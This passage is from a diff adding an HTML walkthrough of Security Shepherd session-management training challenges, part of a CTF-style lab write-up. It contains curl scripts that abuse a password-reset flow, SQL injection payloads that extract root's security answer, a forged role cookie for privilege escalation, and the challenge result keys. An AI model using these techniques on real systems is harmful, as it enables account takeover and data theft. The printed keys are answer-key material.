+curl -v --insecure  <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;subUserName=</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span>     <span class="s2">&quot;</span><span class="nv">$URL_SENDEMAIL</span><span class="s2">&quot;</span>
+
+<span class="c1"># Change password form (requires token) - must do this via curl</span>
+curl --silent --insecure  <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;userName=</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s2">&quot;newPassword=</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s2">&quot;resetPasswordToken=</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span>     <span class="s2">&quot;</span><span class="nv">$URL_CHANGEPW</span><span class="s2">&quot;</span>
+<span class="c1"># Gets output &quot;Password change request success.&quot;</span>
+
+<span class="c1"># Log in to get the result key. Can do this from web page</span>
+curl --silent --insecure  <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;subUserName=</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s2">&quot;subUserPassword=</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span>     <span class="s2">&quot;</span><span class="nv">$URL_SIGNIN</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Welcome admin</span>
+</span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">grp4OqXe7zlJ5Y9tpznQanxOkwj86DINO52sdOJ4h+vihnR5c1Coov0xi4WLVPQoCLM5zrttsSvkSSpDaiSrCNTVCH/KJfZoNXQLayODt1I=</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="session-management-challenge-6">
+<h2>3.15.8.6. Session Management Challenge 6<a class="headerlink" href="#session-management-challenge-6" title="Permalink to this headline">¶</a></h2>
+<p>This challenge involves determining the answer to root’s security question “What is the name of the place your wedding reception was held?”. A SQL injection and good guess at the security question database column name is needed to get the answer.</p>
+<p>The web page is similar to Session Management Challenge 2: a failed attempt at logging into root gives root’s email account “<a class="reference external" href="mailto:elitehacker&#37;&#52;&#48;shepherd&#46;com">elitehacker<span>&#64;</span>shepherd<span>&#46;</span>com</a>” which can be entered to find root’s security question via <span class="guilabel">Get Security Question</span> button. It turns out that the email field is vulnerable to SQL injection but has number of restrictions that limit <strong class="program">sqlmap</strong>’s functionality. For example, the <span class="guilabel">Get Security Question</span> field must be between 10 - 75 characters and some <strong class="program">sqlmap</strong> queries to enumerate the columns require a longer query string.</p>
+<p>To prove there is a SQL injection enter <code class="docutils literal"><span class="pre">&quot;||1#xxxxx</span></code> (5 x’s to get it to 10 characters) to get the question “What is the first name of the person you first kissed?”. To get the answer to the secret question we’ll need a query like <code class="docutils literal"><span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">answerColumn</span> <span class="pre">FROM</span> <span class="pre">answerTable</span> <span class="pre">WHERE</span> <span class="pre">userColumn</span> <span class="pre">=</span> <span class="pre">&quot;root&quot;</span></code> (where we have to guess the column/table names). Note that this query is dangerously close to the 75 character limit.</p>
+<p>First we’ll guess the table name. Hopefully it’s in the same table as the user data so a guess of “users” is shown to be a valid table by <code class="docutils literal"><span class="pre">&quot;&amp;&amp;0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">FROM</span> <span class="pre">users#</span></code> returning the value 1.</p>
+<p>Next we guess the “userColumn”, eventually getting success with “userName” as shown by <code class="docutils literal"><span class="pre">&quot;&amp;&amp;0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">FROM</span> <span class="pre">users</span> <span class="pre">WHERE</span> <span class="pre">userName</span> <span class="pre">=</span> <span class="pre">'root'#</span></code>.</p>
+<p>Finally we guess the answerColumn, trying all sorts of perturbations of “answer”, “security”, and “question”. Eventually you may stumble into “secretAnswer” which is shown to work by <code class="docutils literal"><span class="pre">&quot;&amp;&amp;1</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">secretAnswer</span> <span class="pre">FROM</span> <span class="pre">users</span> <span class="pre">WHERE</span> <span class="pre">userName</span> <span class="pre">=</span> <span class="pre">'root'#</span></code> returning “Deerburn Hotel”. Entering “<a class="reference external" href="mailto:elitehacker&#37;&#52;&#48;shepherd&#46;com">elitehacker<span>&#64;</span>shepherd<span>&#46;</span>com</a>” in <span class="guilabel">Get Security Question</span> and “Deerburn Hotel” in the <span class="guilabel">Submit Answer</span> button returns the result key.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Welcome admin</span>
+</span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">ix5LJUDsJGy7Ca8f1PmavdpJgIE6xLIuDfdAifeVsNtvDwRSqqDXxR3rMu1yrWZFtKDJoZzxki2ybulphtudF8xuOdLunRpzsXNZNET/j3h4eT+bRkMKQxEJsgBkK2ncbmcqhgkQiYRHOKv3xspeUQ==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="session-management-challenge-7">
+<h2>3.15.8.7. Session Management Challenge 7<a class="headerlink" href="#session-management-challenge-7" title="Permalink to this headline">¶</a></h2>
+<p>Just like the previous session management challenge, try logging in as root to get the error message “Incorrect password for <a class="reference external" href="mailto:elitehacker&#37;&#52;&#48;shepherd&#46;com">elitehacker<span>&#64;</span>shepherd<span>&#46;</span>com</a>”. Then enter “<a class="reference external" href="mailto:elitehacker&#37;&#52;&#48;shepherd&#46;com">elitehacker<span>&#64;</span>shepherd<span>&#46;</span>com</a>” in the <span class="guilabel">Get Security Question</span> to get the security question “What is your favourite flower?”. Play around a bit more and realize that every user has the same security question. Now if they were like normally security-aware users the answer would have nothing to do with flowers. But here it is a flower and if you bother to scour the voluminous lists of flowers (I didn’t) you might stumble into the answer “Franklin Tree”. Entering that in <span class="guilabel">Submit Answer</span> gets the result key.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">CvsbVw3yj9EP0N60klYZGnM72AZ/fp6HYIV5bxU+tOOcavLKr0u/fOb/1a6W+GifYvNGVEzT75UFweLJKnpz+co6fAM3OH87gdqSw6xazlafBQI0DvOXOJkJjKI68udQnC/CYKzCyeWvXm/Kf4mT6A==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="session-management-challenge-8">
+<h2>3.15.8.8. Session Management Challenge 8<a class="headerlink" href="#session-management-challenge-8" title="Permalink to this headline">¶</a></h2>
+<p>The easy part is recognizing that the cookie “challengeRole” needs to be modified to allow the <span class="guilabel">Priviledged User Only Button</span>. The hard part is figuring out the actual cipher used to allow guessing at the correct value needed.</p>
+<p>Using Tamper Data or Firebug shows the <span class="guilabel">Priviledged User Only Button</span> uses the new cookie “challengeRole” with value “LmH6nmbC”. It’s not base64-encoded, so what cipher could it be? One source of alternatives is <a class="reference external" href="http://crypo.in.ua/tools/">http://crypo.in.ua/tools/</a> and try lots of them. If you tried ATOM-128 the string “LmH6nmbC” decrypts to “guest”. This leads to trying “admin”, “administrator”, “root”, … . Eventually you may stumble on “superuser” (ATOM-128 encryption “nmHqLjQknlHs”) which works:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data provides URL, COOKIE, POSTDATA</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/714d8601c303bbef8b5cabab60b1060ac41f0d96f53b6ea54705bb1ea4316334&#39;</span>
+<span class="nv">COOKIE_BASE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3=&quot;iuysOEpMSlZw8gEtl0o1UQ==&quot;&#39;</span>
+
+<span class="hll"><span class="c1"># &quot;superuser&quot;</span>
+</span><span class="hll"><span class="nv">CR</span><span class="o">=</span><span class="s2">&quot;nmHqLjQknlHs&quot;</span>
+</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;challengeRole=</span><span class="nv">$CR</span><span class="s2">; </span><span class="nv">$COOKIE_BASE</span><span class="s2">&quot;</span>
+</span>
+curl -v --insecure  <span class="se">\</span>
+     -X POST <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;returnUserRole=false&quot;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s2">&quot;returnPassword=false&quot;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s2">&quot;adminDetected=false&quot;</span> <span class="se">\</span>
+</span>     <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Super User Only Club</span>
+</span><span class="hll"><span class="go">Welcome super user! Your result key is as follows</span>
+</span><span class="hll"><span class="go">Prm04JIV/SC4selS4AyxDL5a9LdXvQhpF1A8t2nJMhzT3K4hi+UMOjfJPziBGF3neD/4TmA1QCk9xqGksRpqrc/9rHetVhhrM7bToMabWRUJMwjrf2XJzDnqbZ+jaSE/zj1Vn7IdDUpvxeg3CCKo8w==</span>
+</span></pre></div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="security_shepherd_xss.html" class="btn btn-neutral float-right" title="3.15.9. XSS" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="security_shepherd_direct_ref.html" class="btn btn-neutral" title="3.15.7. Insecure Direct Object References" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
